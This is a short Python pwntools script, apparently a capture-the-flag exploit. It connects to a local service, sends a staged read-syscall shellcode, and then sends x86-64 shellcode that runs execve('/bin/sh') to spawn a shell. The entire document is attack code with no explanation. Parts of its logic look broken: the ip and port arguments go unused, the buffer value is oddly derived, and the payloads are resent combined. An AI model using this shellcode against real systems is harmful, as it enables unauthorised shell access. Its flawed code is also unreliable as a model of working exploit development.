from pwn import *
from random import randint
#if __name__=="__main__":
def method2(ip, port):
    log.info("Method 2 applied!")
    r = remote("127.0.0.1", 80)

    context.arch = "amd64"

    buf = int(str(randint(400,99999)), 16)


    r.send(p64(buf))

    payload = asm("""
    xor rdx,rdx
    mov dl,0xff
    syscall
    nop
    """)

    r.send(payload)

    payload += asm("""
    mov rbx,0x0068732f6e69622f
    push rbx
    push rsp
    pop rdi
    xor rsi,rsi
    push rsi
    pop rdx
    push rdx
    pop rax
    mov al,0x3b
    syscall
    mov al,0x3c
    xor rdi,rdi
    syscall
    """)

    r.send(payload)
